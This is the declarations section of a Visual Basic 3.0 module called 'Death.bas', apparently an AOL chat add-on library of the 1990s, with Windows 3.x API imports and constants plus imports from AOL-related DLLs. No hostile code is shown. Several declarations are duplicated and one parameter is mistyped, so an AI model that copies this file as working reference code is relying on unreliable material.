'  _______________________________________________________
' |                                                       |
' |    Death Application Development File For VB 3.0 Pro  |
' |           Designed In Visual Basic Pro 3.0            |
' |                Project Name: Death.bas                |
' |                   Death.Bas By Flare                  |
' |                    Private Bas File                   |
' |                      Version 2.0                      |
' |_______________________________________________________|
' |To Call A Sub With Death.bas Type                      |
' |Sub                                                    |
' |Example is:                                            |
' |SendRoom "Hi"                                          |
' |To Call A Function With Death.bas Example              |
' |example = UserSN()                                     |
' |_______________________________________________________|
Declare Function GetModuleFileName Lib "Kernel" (ByVal hModule As Integer, ByVal lpFilename As String, ByVal nSize As Integer) As Integer
Global Const WM_GETDLGCODE = &H87
Global Const WM_CTLCOLOR = &H19
Declare Function ShowWindow Lib "User" (ByVal hWnd As Integer, ByVal nCmdShow As Integer) As Integer
Global Const LBN_DBLCLK = 2
Declare Function winmail Lib "Silence.Dll" (ByVal Recieve As String, ByVal Address As String, ByVal subject As String, ByVal Body As String) As Integer
Declare Function CreateWindow% Lib "User" (ByVal lpClassName$, ByVal lpWindowName$, ByVal dwStyle&, ByVal x%, ByVal y%, ByVal nWidth%, ByVal nHeight%, ByVal hWndParent%, ByVal hMenu%, ByVal hInstance%, ByVal lpParam$)
Global Const MF_BYPOSITION = &H400
Global Const WM_USER = &H400
Global Const EM_SETFONT = WM_USER + 19
Global Const LB_GETITEMDATA = (WM_USER + 26)
Declare Function windowfrompoint Lib "User" (ByVal ptScreen As Any) As Integer
Type RECT
    Left As Integer
    Top As Integer
    right As Integer
    bottom As Integer
End Type
Global Const LB_FINDSTRING = (WM_USER + 16)
Type POINTAPI
    x As Integer
    y As Integer
End Type
Declare Sub getcursorpos Lib "User" (lpPoint As POINTAPI)
Declare Function SystemParametersInfo Lib "User" (ByVal uAction As Integer, ByVal uParam As Integer, lpvParam As Any, ByVal fuWinIni As Integer) As Integer
Declare Function GetCurrentPosition Lib "GDI" (ByVal hDC As Integer) As Long
Declare Function GetCurrentPositionEx Lib "GDI" (ByVal hDC As Integer, lpPoint As POINTAPI) As Integer
Global Const LB_GETCURSEL = (WM_USER + 9)
Declare Function SetBkMode Lib "GDI" (ByVal hDC As Integer, ByVal nBkMode As Integer) As Integer
Global Const EM_GETLINE = WM_USER + 20
Declare Sub ReleaseCapture Lib "User" ()
Global Const EM_GETLINECOUNT = WM_USER + 10
Declare Function GetWindowsDirectory Lib "Kernel" (ByVal lpBuffer As String, ByVal nSize As Integer) As Integer
Declare Function SetBkMode Lib "GDI" (ByVal hDC As Integer, ByVal nBkMode As Integer) As Integer
Global Const GW_CHILD = 5
Declare Function showcursor Lib "User" (ByVal cShow As Integer) As Integer 'Mouse Show/Hide API Call.
Global Const LB_GETSEL = (WM_USER + 8)
Declare Function GetModuleHandle Lib "Kernel" (ByVal lpModuleName As String) As Integer
Declare Function GetModuleFileName Lib "Kernel" (ByVal hModule As Integer, ByVal lpFilename As String, ByVal nSize As Integer) As Integer
Global Const GW_HWNDFIRST = 0
Declare Function sndPlaySound Lib "MMSystem" (ByVal lpWavName$, ByVal Flags%) As Integer '
Declare Function RemoveMenu Lib "User" (ByVal hMenu As Integer, ByVal nPosition As Integer, ByVal wFlags As Integer) As Integer
Global Const WM_MOVE = &H3
Global Const SWP_NOREPOSITION = &H200
Declare Sub movewindow Lib "User" (ByVal hWnd As Integer, ByVal x As Integer, ByVal y As Integer, ByVal nWidth As Integer, ByVal nHeight As Integer, ByVal bRepaint As Integer)
Declare Sub clienttoscreen Lib "User" (ByVal hWnd As Integer, lpPoint As POINTAPI)
Declare Sub setcapture Lib "User" (ByVal hWnd As Integer)
Declare Function setparent Lib "User" (ByVal hWndChild As Integer, ByVal hWndNewParent As Integer) As Integer
Global Const WM_LBUTTONDBLCLK = &H203
Global Const WS_DISABLED = &H8000000
Global Const WM_CLOSE = &H10
Declare Function enablewindow Lib "User" (ByVal hWnd As Integer, ByVal aBOOL As Integer) As Integer
Global Const CB_GETCOUNT = (WM_USER + 6)
Global Const CB_GETLBTEXT = (WM_USER + 8)
Global Const WM_ENABLE = &HA
Global Const LB_Setcursel = (WM_USER + 7)
Global Const WM_ACTIVATE = &H6
Global Const LB_GETTEXT = (WM_USER + 10)
Global Const WM_KILLFOCUS = &H8
Global Const WM_SETFOCUS = &H7
Global Const LB_GETCOUNT = (WM_USER + 12)
Global Const WM_SIZE = &H5
Global Const SW_Hide = 0
Global Const SW_SHOWNORMAL = 1
'Declare Sub GetWindowRect Lib "User" (ByVal hWnd As Integer, lpRect As rect)
Global Const SW_Show = 5
Global Const SW_NORMAL = 1
Global Const SW_SHOWMINIMIZED = 2
Global Const SW_SHOWMAXIMIZED = 3
Global Const SW_MAXIMIZE = 3
Global Const SW_SHOWNOACTIVATE = 4
Global Const SW_MINIMIZE = 6
Global Const SW_SHOWMINNOACTIVE = 7
Global Const SW_SHOWNA = 8
Global Const SW_RESTORE = 9
Global Const WM_FONTCHANGE = &H1D
Global Const WM_SETFONT = &H30

Type MODEL
  usVersion         As Integer
  fl                As Long
  pctlproc          As Long
  fsClassStyle      As Integer
  flWndStyle        As Long
  cbCtlExtra        As Integer
  idBmpPalette      As Integer
  npszDefCtlName    As Integer
  npszClassName     As Integer
  npszParentClassName As Integer
  npproplist        As Integer
  npeventlist       As Integer
  nDefProp          As String * 1
  nDefEvent         As String * 1
  nValueProp        As String * 1
  usCtlVersion      As Integer
End Type
Type HelpWinInfo
  wStructSize As Integer
  x As Integer
  y As Integer
  dx As Integer
  dy As Integer
  wMax As Integer
  rgChMember As String * 2
End Type

'                   API Subs and Functions
'                   ----------------------

'Subs and Functions for "User"
Declare Sub ShowOwnedPopups Lib "User" (ByVal hWnd%, ByVal fShow%)
Declare Sub DrawMenuBar Lib "User" (ByVal hWnd As Integer)
Declare Sub SetCursorPos Lib "User" (ByVal x As Integer, ByVal y As Integer)
Declare Sub ShowOwnedPopups Lib "User" (ByVal hWnd%, ByVal fShow%)
Declare Function GetFreeSystemResources Lib "User" (ByVal fuSysResource%) As Integer
Declare Function GetClassWord Lib "User" (ByVal hWnd%, ByVal nIndex%) As Integer
Declare Function SetClassWord Lib "User" (ByVal hWnd%, ByVal nIndex%, ByVal wNewWord%) As Integer
Declare Function getnextwindow Lib "User" (ByVal hWnd As Integer, ByVal wFlag As Integer) As Integer
Declare Function FindWindowByNum% Lib "User" Alias "FindWindow" (ByVal lpClassName&, ByVal lpWindowName&)
Declare Function FindWindowByString% Lib "User" Alias "FindWindow" (ByVal lpClassName&, ByVal lpWindowName&)
Declare Function exitwindow% Lib "User" (ByVal dwReturnCode&, ByVal wReserved%)
Declare Function setparent% Lib "User" (ByVal hWndChild As Integer, ByVal hWndNewParent As Integer)
Declare Function GetMessage% Lib "User" (lpMsg As String, ByVal hWnd As Integer, ByVal wMsgFilterMin As Integer, ByVal wMsgFilterMax As Integer)
'Declare Function sendmessage& Lib "User" (ByVal hWnd%, ByVal wmsg%, ByVal wparam%, ByVal lParam As Any)
Declare Function CreateMenu% Lib "User" ()
Declare Function AppendMenu Lib "User" (ByVal hMenu As Integer, ByVal wFlags As Integer, ByVal wIDNewItem As Integer, ByVal lpNewItem As Any) As Integer
Declare Function appendmenubystring% Lib "User" Alias "AppendMenu" (ByVal hMenu%, ByVal wFlag%, ByVal wIDNewItem%, ByVal lpNewItem$)
Declare Function InsertMenu% Lib "User" (ByVal hMenu As Integer, ByVal nPosition As Integer, ByVal wFlags As Integer, ByVal wIDNewItem As Integer, ByVal lpNewItem As Any)
Declare Function WinHelp% Lib "User" (ByVal hWnd As Integer, ByVal lpHelpFile As String, ByVal wCommand As Integer, dwData As Any)
Declare Function WinHelpByString% Lib "User" Alias "WinHelp" (ByVal hWnd As Integer, ByVal lpHelpFile As String, ByVal wCommand As Integer, ByVal dwData$)
Declare Function WinHelpByNum% Lib "User" Alias "WinHelp" (ByVal hWnd As Integer, ByVal lpHelpFile As String, ByVal wCommand As Integer, ByVal dwData&)
Declare Function getwindowtext% Lib "User" (ByVal hWnd As Integer, ByVal LcaseString As String, ByVal aint As Integer)
Declare Function GetWindowWOrd Lib "User" (ByVal hWnd As Integer, ByVal nIndex As Integer) As Integer
Declare Function SetWindowText% Lib "User" (ByVal hWnd As Integer, ByVal LcaseString As String)
Declare Function GetActiveWindow% Lib "User" ()
Declare Function SetActiveWindow% Lib "User" (ByVal hWnd%)
Declare Function GetSysModalWindow% Lib "User" ()
Declare Function SetSysModalWindow% Lib "User" (ByVal hWnd As Integer)
Declare Function IsWindowVisible% Lib "User" (ByVal hWnd%)
Declare Function GetScrollPos Lib "User" (ByVal hWnd As Integer, ByVal nBar As Integer) As Integer
Declare Function getcursor% Lib "User" ()
Declare Function getclassname Lib "User" (ByVal hWnd As Integer, ByVal lpClassName As String, ByVal nMaxCount As Integer) As Integer
Global Const BM_SETCHECK = WM_USER + 1
Declare Function GetSystemMenu Lib "User" (ByVal hWnd As Integer, ByVal bRevert As Integer) As Integer
Declare Function GetNextDlgTabItem Lib "User" (ByVal hDlg As Integer, ByVal hctl As Integer, ByVal bPrevious As Integer) As Integer
Declare Function GetWindowTextLength Lib "User" (ByVal hWnd As Integer) As Integer
Declare Function Gettopwindow Lib "User" (ByVal hWnd As Integer) As Integer
Declare Function ArrangeIconicWindow% Lib "User" (ByVal hWnd%)
Declare Function GetMenuState% Lib "User" (ByVal hMenu%, ByVal wId%, ByVal wFlags%)
Declare Function GetSystemMetrics Lib "User" (ByVal nIndex%) As Integer
Declare Function GetDesktopWindow Lib "User" () As Integer
Declare Function SwapMouseButton% Lib "User" (ByVal bSwap%)
Declare Function ENumChildWindow% Lib "User" (ByVal hWndParent%, ByVal lpenumfunc&, ByVal lParam&)

'Subs and Functions for "Kernel"
Declare Function lStrlenAPI Lib "Kernel" Alias "lStrln" (ByVal lp As Long) As Integer
Declare Function GetWindowDirectory% Lib "Kernel" (ByVal lpBuffer$, ByVal nSize%)
Declare Function GetWinFlags Lib "Kernel" () As Long
Declare Function GetVersion Lib "Kernel" () As Long
Declare Function GetFreeSpace Lib "Kernel" (ByVal wFlags%) As Long
Declare Function GetSystemDirectory Lib "Kernel" (ByVal lpBuffer$, ByVal nSize%) As Integer
Declare Function WritePrivateProfileString Lib "Kernel" (ByVal AppName As String, ByVal KeyName As String, ByVal NewString As String, ByVal Filename As String) As Integer
Declare Function GetPrivateProfileString Lib "Kernel" (ByVal AppName As String, ByVal KeyName As String, ByVal default As String, ByVal ReturnedString As String, ByVal MAXSIZE As Integer, ByVal Filename As String) As Integer
Declare Function GetProfileInt Lib "Kernel" (ByVal lpAppName$, ByVal lpKeyName$, ByVal nDefault%) As Integer
Declare Function GetProfileString Lib "Kernel" (ByVal lpAppName$, ByVal lpKeyName$, ByVal lpDefault$, ByVal lpReturnedString$, ByVal nSize%) As Integer
Declare Function WriteProfileString Lib "Kernel" (ByVal lpAppName$, ByVal lpKeyName$, ByVal LcaseString$) As Integer
Declare Function GetPrivateProfileInt Lib "Kernel" (ByVal lpAppName$, ByVal lpKeyName$, ByVal nDefault%, ByVal lpFilename$) As Integer
Declare Function aggetstringfromlpstr$ Lib "APIGUIDE.DLL" (ByVal LcaseString&)

'Subs and Functions for "GDI"
Declare Sub SetBkColor Lib "GDI" (ByVal hDC As Integer, ByVal crColor As Long)
Declare Sub Rectangle Lib "GDI" (ByVal hDC As Integer, ByVal x1 As Integer, ByVal Y1 As Integer, ByVal x2 As Integer, ByVal Y2 As Integer)
Declare Sub DeleteObject Lib "GDI" (ByVal hObject As Integer)
Declare Function GetDeviceCaps Lib "GDI" (ByVal hDC%, ByVal nIndex%) As Integer
Declare Function TextOut Lib "GDI" (ByVal hDC As Integer, ByVal x As Integer, ByVal y As Integer, ByVal LcaseString As String, ByVal nCount As Integer) As Integer
Declare Function FloodFill Lib "GDI" (ByVal hDC As Integer, ByVal x As Integer, ByVal y As Integer, ByVal crColor As Long) As Integer
Declare Function settextcolor Lib "GDI" (ByVal hDC As Integer, ByVal crColor As Long) As Long
Declare Function BitBlt Lib "GDI" (ByVal hDestDC As Integer, ByVal x As Integer, ByVal y As Integer, ByVal nWidth As Integer, ByVal nHeight As Integer, ByVal hSrcDC As Integer, ByVal XSrc As Integer, ByVal YSrc As Integer, ByVal dwRop As Long) As Integer

'Subs and Functions for "MMSystem"
Declare Function MciSendString& Lib "MMSystem" (ByVal Cmd$, ByVal Returnstr As Any, ByVal returnlen%, ByVal hcallback%)

'Subs and Functions for "VBWFind.Dll"
Declare Function findchild% Lib "VBWFind.Dll" (ByVal hWnd%, ByVal Title$)

'Subs and Functions for "APIGuide.Dll"
Declare Sub agCopyData Lib "APIGuide.Dll" (source As Any, dest As Any, ByVal nCount%)
Declare Sub agCopyDataBynum Lib "APIGuide.Dll" Alias "agCopyData" (ByVal source&, ByVal dest&, ByVal nCount%)
Declare Sub agDWordTo2Integers Lib "APIGuide.Dll" (ByVal L&, lw%, lh%)
Declare Sub agOutp Lib "APIGuide.Dll" (ByVal portid%, ByVal outval%)
Declare Sub agOutpw Lib "APIGuide.Dll" (ByVal portid%, ByVal outval%)
Declare Function agGetControlHwnd% Lib "APIGuide.Dll" (hctl As Control)
Declare Function agGetInstance% Lib "APIGuide.Dll" ()
Declare Function agGetAddressForObject& Lib "APIGuide.Dll" (object As Any)
Declare Function agGetAddressForInteger& Lib "APIGuide.Dll" Alias "agGetAddressForObject" (intnum%)
Declare Function agGetAddressForLong& Lib "APIGuide.Dll" Alias "agGetAddressForObject" (intnum&)
Declare Function agGetAddressForLPSTR& Lib "APIGuide.Dll" Alias "agGetAddressForObject" (ByVal LcaseString$)
Declare Function agGetAddressForVBString& Lib "APIGuide.Dll" (vbstring$)
Declare Function agGetControlName$ Lib "APIGuide.Dll" (ByVal hWnd%)
Declare Function agXPixelsToTwips& Lib "APIGuide.Dll" (ByVal pixels%)
Declare Function agYPixelsToTwips& Lib "APIGuide.Dll" (ByVal pixels%)
Declare Function agXTwipsToPixels% Lib "APIGuide.Dll" (ByVal twips&)
Declare Function agYTwipsToPixels% Lib "APIGuide.Dll" (ByVal twips&)
Declare Function agDeviceCapabilities& Lib "APIGuide.Dll" (ByVal hlib%, ByVal lpszDevice$, ByVal lpszPort$, ByVal fwCapability%, ByVal lpszOutput&, ByVal lpdm&)
Declare Function agDeviceMode% Lib "APIGuide.Dll" (ByVal hWnd%, ByVal hModule%, ByVal lpszDevice$, ByVal lpszOutput$)
Declare Function agExtDeviceMode% Lib "APIGuide.Dll" (ByVal hWnd%, ByVal hDriver%, ByVal lpdmOutput&, ByVal lpszDevice$, ByVal lpszPort$, ByVal lpdmInput&, ByVal lpszProfile&, ByVal fwMode%)
Declare Function agInp% Lib "APIGuide.Dll" (ByVal portid%)
Declare Function agInpw% Lib "APIGuide.Dll" (ByVal portid%)
Declare Function agHugeOffset& Lib "APIGuide.Dll" (ByVal addr&, ByVal offset&)
Declare Function agVBGetVersion% Lib "APIGuide.Dll" ()
Declare Function agVBSendControlMsg& Lib "APIGuide.Dll" (ctl As Control, ByVal msg%, ByVal wp%, ByVal lp&)
Declare Function agVBSetControlFlags& Lib "APIGuide.Dll" (ctl As Control, ByVal mask&, ByVal value&)
Declare Function dwVBSetControlFlags& Lib "APIGuide.Dll" (ctl As Control, ByVal mask&, ByVal value&)


'Subs and Functions for "VBMsg.Vbx"
Declare Sub ptGetTypeFromAddress Lib "VBMsg.Vbx" (ByVal lAddress As Long, lpType As Any, ByVal cbBytes As Integer)
Declare Sub ptCopyTypeToAddress Lib "VBMsg.Vbx" (ByVal lAddress As Long, lpType As Any, ByVal cbBytes As Integer)
Declare Sub ptSetControlModel Lib "VBMsg.Vbx" (ctl As Control, lpm As MODEL)
Declare Function ptGetVariableAddress Lib "VBMsg.Vbx" (Var As Any) As Long
Declare Function ptGetTypeAddress Lib "VBMsg.Vbx" Alias "ptGetVariableAddress" (Var As Any) As Long
Declare Function ptGetStringAddress Lib "VBMsg.Vbx" Alias "ptGetVariableAddress" (ByVal S As String) As Long
Declare Function ptGetLongAddress Lib "VBMsg.Vbx" Alias "ptGetVariableAddress" (L As Long) As Long
Declare Function ptGetIntegerAddress Lib "VBMsg.Vbx" Alias "ptGetVariableAddress" (i As Integer) As Long
Declare Function ptGetIntegerFromAddress Lib "VBMsg.Vbx" (ByVal i As Long) As Integer
Declare Function ptGetLongFromAddress Lib "VBMsg.Vbx" (ByVal L As Long) As Long
Declare Function ptGetStringFromAddress Lib "VBMsg.Vbx" (ByVal lAddress As Long, ByVal cbBytes As Integer) As String
Declare Function ptMakelParam Lib "VBMsg.Vbx" (ByVal wLow As Integer, ByVal wHigh As Integer) As Long
Declare Function ptLoWord Lib "VBMsg.Vbx" (ByVal lParam As Long) As Integer
Declare Function ptHiWord Lib "VBMsg.Vbx" (ByVal lParam As Long) As Integer
Declare Function ptMakeUShort Lib "VBMsg.Vbx" (ByVal LongVal As Long) As Integer
Declare Function ptConvertUShort Lib "VBMsg.Vbx" (ByVal ushortVal As Integer) As Long
Declare Function ptMessagetoText Lib "VBMsg.Vbx" (ByVal uMsgID As Long, ByVal bFlag As Integer) As String
Declare Function ptRecreateControlHwnd Lib "VBMsg.Vbx" (ctl As Control) As Long
Declare Function ptGetControlModel Lib "VBMsg.Vbx" (ctl As Control, lpm As MODEL) As Long
Declare Function ptGetControlName Lib "VBMsg.Vbx" (ctl As Control) As String

'Subs and Functions for Other DLL's and VBX's
Declare Function GetNames Lib "311.Dll" Alias "AOLGetList" (ByVal p1%, ByValp2$) As Integer
Declare Function VarPtr& Lib "VBRun300.Dll" (Param As Any)
Declare Function vbeNumChildWindow% Lib "VBStr.Dll" (ByVal win%, ByVal iNum%)

'                   Sound Constants
'                   ---------------

Global Const SND_SYNC = &H0
Global Const SND_ASYNC = &H1
Global Const SND_NODEFAULT = &H2
Global Const SND_LOOP = &H8
Global Const SND_NOSTOP = &H10

'                   Global Constants
'                   ----------------
'OpenFile() Flags
Global Const OF_READ = &H0
Global Const OF_WRITE = &H1
Global Const OF_READWRITE = &H2
Global Const OF_SHARE_COMPAT = &H0
Global Const OF_SHARE_EXCLUSIVE = &H10
Global Const OF_SHARE_DENY_WRITE = &H20
Global Const OF_SHARE_DENY_READ = &H30
Global Const OF_SHARE_DENY_NONE = &H40
Global Const OF_PARSE = &H100
Global Const OF_DELETE = &H200
Global Const OF_VERIFY = &H400
Global Const OF_SEARCH = &H400
Global Const OF_CANCEL = &H800
Global Const OF_CREATE = &H1000
Global Const OF_PROMPT = &H2000
Global Const OF_EXIST = &H4000
Global Const OF_REOPEN = &H8000
Global Const TF_FORCEDRIVE = &H80

'GetDriveType return values
Global Const DRIVE_REMOVABLE = 2
Global Const DRIVE_FIXED = 3
Global Const DRIVE_REMOTE = 4

'Global Memory Flags
Global Const GMEM_FIXED = &H0
Global Const GMEM_MOVEABLE = &H2
Global Const GMEM_NOCOMPACT = &H10
Global Const GMEM_NODISCARD = &H20
Global Const GMEM_ZEROINIT = &H40
Global Const GMEM_MODIFY = &H80
Global Const GMEM_DISCARDABLE = &H100
Global Const GMEM_NOT_BANKED = &H1000
Global Const GMEM_SHARE = &H2000
Global Const GMEM_DDESHARE = &H2000
Global Const GMEM_NOTIFY = &H4000
Global Const GMEM_LOWER = GMEM_NOT_BANKED
Global Const GHND = (GMEM_MOVEABLE Or GMEM_ZEROINIT)
Global Const GPTR = (GMEM_FIXED Or GMEM_ZEROINIT)

'Flags returned by GlobalFlags (in addition to GMEM_DISCARDABLE)
Global Const GMEM_DISCARDED = &H4000
Global Const GMEM_LOCKCOUNT = &HFF

'Predefined Resource Types
Global Const RT_CURSOR = 1&
Global Const RT_BITMAP = 2&
Global Const RT_ICON = 3&
Global Const RT_MENU = 4&
Global Const RT_DIALOG = 5&
Global Const RT_STRING = 6&
Global Const RT_FONTDIR = 7&
Global Const RT_FONT = 8&
Global Const RT_ACCELERATOR = 9&
Global Const RT_RCDATA = 10&

'GetFreeSystemResources
Global Const GFSR_SYSTEMRESOURCES = 0
Global Const GFSR_GDIRESOURCES = 1
Global Const GFSR_USERRESOURCES = 2

'GetWinFlags
Global Const WF_PMODE = &H1
Global Const WF_CPU286 = &H2
Global Const WF_CPU386 = &H4
Global Const WF_CPU486 = &H8
Global Const WF_STANDARD = &H10
Global Const WF_WIN286 = &H10
Global Const WF_ENHANCED = &H20
Global Const WF_WIN386 = &H20
Global Const WF_CPU086 = &H40
Global Const WF_CPU186 = &H80
Global Const WF_LARGEFRAME = &H100
Global Const VK_END = &H23
Global Const WF_SMALLFRAME = &H200
Global Const WF_80x87 = &H400

'Parameter error checking
Global Const ERR_WARNING = 8
Global Const ERR_PARAM = 4
Global Const ERR_SIZE_MASK = 3
Global Const ERR_BYTE = 1
Global Const ERR_WORD = 2
Global Const ERR_DWORD = 3
Global Const ERR_BAD_VALUE = &H6001
Global Const ERR_BAD_FLAGS = &H6002
Global Const ERR_BAD_INDEX = &H6003
Global Const ERR_BAD_DVALUE = &H7004
Global Const ERR_BAD_DFLAGS = &H7005
Global Const ERR_BAD_DINDEX = &H7006
Global Const ERR_BAD_PTR = &H7007
Global Const ERR_BAD_FUNC_PTR = &H7008
Global Const ERR_BAD_SELECTOR = &H6009
Global Const ERR_BAD_STRING_PTR = &H700A
Global Const ERR_BAD_HANDLE = &H600B

'KERNEL parameter errors
Global Const ERR_BAD_HINSTANCE = &H6020
Global Const ERR_BAD_HMODULE = &H6021
Global Const ERR_BAD_GLOBAL_HANDLE = &H6022
Global Const ERR_BAD_LOCAL_HANDLE = &H6023
Global Const ERR_BAD_ATOM = &H6024
Global Const ERR_BAD_HFILE = &H6025

'USER parameter errors
Global Const ERR_BAD_HWND = &H6040
Global Const ERR_BAD_HMENU = &H6041
Global Const ERR_BAD_HCURSOR = &H6042
Global Const ERR_BAD_HICON = &H6043
Global Const ERR_BAD_HDWP = &H6044
Global Const ERR_BAD_CID = &H6045
Global Const ERR_BAD_HDRVR = &H6046

'GDI parameter errors
Global Const ERR_BAD_COORDS = &H7060
Global Const ERR_BAD_GDI_OBJECT = &H6061
Global Const ERR_BAD_HDC = &H6062
Global Const ERR_BAD_HPEN = &H6063
Global Const ERR_BAD_HFONT = &H6064
Global Const ERR_BAD_HBRUSH = &H6065
Global Const ERR_BAD_HBITMAP = &H6066
Global Const ERR_BAD_HRGN = &H6067
Global Const ERR_BAD_HPALETTE = &H6068
Global Const ERR_BAD_HMETAFILE = &H6069

'KERNEL errors
Global Const ERR_GALLOC = &H1
Global Const ERR_GREALLOC = &H2
Global Const ERR_GLOCK = &H3
Global Const ERR_LALLOC = &H4
Global Const ERR_LREALLOC = &H5
Global Const ERR_LLOCK = &H6
Global Const ERR_ALLOCRES = &H7
Global Const ERR_LOCKRES = &H8
Global Const ERR_LOADMODULE = &H9

'USER errors
Global Const ERR_CREATEDLG = &H40
Global Const ERR_CREATEDLG2 = &H41
Global Const ERR_REGISTERCLASS = &H42
Global Const ERR_DCBUSY = &H43
Global Const ERR_CREATEWND = &H44
Global Const ERR_STRUCEXTRA = &H45
Global Const ERR_LOADSTR = &H46
Global Const ERR_LOADMENU = &H47
Global Const ERR_NESTEDBEGINPAINT = &H48
Global Const ERR_BADINDEX = &H49
Global Const ERR_CREATEMENU = &H4A

'GDI errors
Global Const ERR_CREATEDC = &H80
Global Const ERR_CREATEMETA = &H81
Global Const ERR_DELOBJSELECTED = &H82
Global Const ERR_SELBITMAP = &H83

'Exit Window parameters

Global Const EW_RESTARTWindow = &H42
Global Const EW_REBOOTSYSTEM = &H43


'Stock system bitmaps
Global Const OBM_CLOSE = 32754
Global Const OBM_UPARROW = 32753
Global Const OBM_DNARROW = 32752
Global Const OBM_RGARROW = 32751
Global Const OBM_LFARROW = 32750
Global Const OBM_REDUCE = 32749
Global Const OBM_ZOOM = 32748
Global Const OBM_RESTORE = 32747
Global Const OBM_REDUCED = 32746
Global Const OBM_ZOOMD = 32745
Global Const OBM_RESTORED = 32744
Global Const OBM_UPARROWD = 32743
Global Const OBM_DNARROWD = 32742
Global Const OBM_RGARROWD = 32741
Global Const OBM_LFARROWD = 32740
Global Const OBM_MNARROW = 32739
Global Const OBM_COMBO = 32738
Global Const OBM_UPARROWI = 32737
Global Const OBM_DNARROWI = 32736
Global Const OBM_RGARROWI = 32735
Global Const OBM_LFARROWI = 32734
Global Const OBM_OLD_CLOSE = 32767
Global Const OBM_SIZE = 32766
Global Const OBM_OLD_UPARROW = 32765
Global Const OBM_OLD_DNARROW = 32764
Global Const OBM_OLD_RGARROW = 32763
Global Const OBM_OLD_LFARROW = 32762
Global Const OBM_BTSIZE = 32761
Global Const OBM_CHECK = 32760
Global Const OBM_CHECKBOXES = 32759
Global Const OBM_BTNCORNERS = 32758
Global Const OBM_OLD_REDUCE = 32757
Global Const OBM_OLD_ZOOM = 32756
Global Const OBM_OLD_RESTORE = 32755

'Stock system Icons
Global Const OCR_NORMAL = 32512
Global Const OCR_IBEAM = 32513
Global Const OCR_WAIT = 32514
Global Const OCR_CROSS = 32515
Global Const OCR_UP = 32516
Global Const OCR_SIZE = 32640
Global Const OCR_ICON = 32641
Global Const OCR_SIZENWSE = 32642
Global Const OCR_SIZENESW = 32643
Global Const OCR_SIZEWE = 32644
Global Const OCR_SIZENS = 32645
Global Const OCR_SIZEALL = 32646
Global Const OCR_ICOCUR = 32647
Global Const OIC_SAMPLE = 32512
Global Const OIC_HAND = 32513
Global Const OIC_QUES = 32514
Global Const OIC_BANG = 32515
Global Const OIC_NOTE = 32516

'Raster-ops (Binary)
Global Const R2_BLACK = 1 ' 0
Global Const R2_NOTMERGEPEN = 2 'DPon
Global Const R2_MASKNOTPEN = 3'DPna
Global Const R2_NOTCOPYPEN = 4'PN
Global Const R2_MASKPENNOT = 5'PDna
Global Const R2_NOT = 6 'Dn
Global Const R2_XORPEN = 7'DPx
Global Const R2_NOTMASKPEN = 8'DPan
Global Const R2_MASKPEN = 9 'DPa
Global Const R2_NOTXORPEN = 10'DPxn
Global Const R2_NOP = 11'D
Global Const R2_MERGENOTPEN = 12'DPno
Global Const R2_COPYPEN = 13'P
Global Const R2_MERGEPENNOT = 14'PDno
Global Const R2_MERGEPEN = 15 'DPo
Global Const R2_WHITE = 16' 1

'Raster-ops (Ternary)
Global Const SRCCOPY = &HCC0020
Global Const SRCPAINT = &HEE0086
Global Const SRCAND = &H8800C6
Global Const SRCINVERT = &H660046
Global Const SRCERASE = &H440328
Global Const NOTSRCCOPY = &H330008
Global Const NOTSRCERASE = &H1100A6
Global Const MERGECOPY = &HC000CA
Global Const MERGEPAINT = &HBB0226
Global Const PATCOPY = &HF00021
Global Const PATPAINT = &HFB0A09
Global Const PATINVERT = &H5A0049
Global Const DSTINVERT = &H550009
Global Const BLACKNESS = &H42&
Global Const WHITENESS = &HFF0062

'StretchBlt() Modes
Global Const BLACKONWHITE = 1
Global Const WHITEONBLACK = 2
Global Const COLORONCOLOR = 3

'PolyFill() Modes
Global Const ALTERNATE = 1
Global Const WINDING = 2

'Text Alignment Options
Global Const TA_NOUPDATECP = 0
Global Const TA_UPDATECP = 1
Global Const TA_LEFT = 0
Global Const TA_RIGHT = 2
Global Const TA_CENTER = 6
Global Const TA_TOP = 0
Global Const TA_BOTTOM = 8
Global Const TA_BASELINE = 24

'ExtTextOut flags
Global Const ETO_GRAYED = 1
Global Const ETO_OPAQUE = 2
Global Const ETO_CLIPPED = 4

'SetMapperFlags
Global Const ASPECT_FILTERING = &H1

'Metafile Functions
Global Const META_SETBKCOLOR = &H201
Global Const META_SETBKMODE = &H102
Global Const META_SETMAPMODE = &H103
Global Const META_SETROP2 = &H104
Global Const META_SETRELABS = &H105
Global Const META_SETPOLYFILLMODE = &H106
Global Const META_SETSTRETCHBLTMODE = &H107
Global Const META_SETTEXTCHAREXTRA = &H108
Global Const META_SETTEXTCOLOR = &H209
Global Const META_SETTEXTJUSTIFICATION = &H20A
Global Const META_SETWINDOWORG = &H20B
Global Const META_SETWINDOWEXT = &H20C
Global Const META_SETVIEWPORTORG = &H20D
Global Const META_SETVIEWPORTEXT = &H20E
Global Const META_OFFSETWINDOWORG = &H20F
Global Const META_SCALEWINDOWEXT = &H400
Global Const META_OFFSETVIEWPORTORG = &H211
Global Const META_SCALEVIEWPORTEXT = &H412
Global Const META_LINETO = &H213
Global Const META_MOVETO = &H214
Global Const META_EXCLUDECLIPRECT = &H415
Global Const META_INTERSECTCLIPRECT = &H416
Global Const META_ARC = &H817
Global Const META_ELLIPSE = &H418
Global Const META_FLOODFILL = &H419
Global Const META_PIE = &H81A
Global Const META_RECTANGLE = &H41B
Global Const META_ROUNDRECT = &H61C
Global Const META_PATBLT = &H61D
Global Const META_SAVEDC = &H1E
Global Const META_SETPIXEL = &H41F
Global Const META_OFFSETCLIPRGN = &H220
Global Const META_TEXTOUT = &H521
Global Const META_BITBLT = &H902
Global Const META_STRETCHBLT = &HB23
Global Const META_POLYGON = &H324
Global Const META_POLYLINE = &H325
Global Const META_ESCAPE = &H626
Global Const META_RESTOREDC = &H127
Global Const META_FILLREGION = &H228
Global Const META_FRAMEREGION = &H429
Global Const META_INVERTREGION = &H12A
Global Const META_PAINTREGION = &H12B
Global Const META_SELECTCLIPREGION = &H12C
Global Const META_SELECTOBJECT = &H12D
Global Const META_SETTEXTALIGN = &H12E
Global Const META_DRAWTEXT = &H62F
Global Const META_CHORD = &H830
Global Const META_SETMAPPERFLAGS = &H231
Global Const META_EXTTEXTOUT = &HA32
Global Const META_SETDIBTODEV = &HD33
Global Const META_SELECTPALETTE = &H234
Global Const META_REALIZEPALETTE = &H35
Global Const META_ANIMATEPALETTE = &H436
Global Const META_SETPALENTRIES = &H37
Global Const META_POLYPOLYGON = &H538
Global Const META_RESIZEPALETTE = &H139
Global Const META_DIBBITBLT = &H940
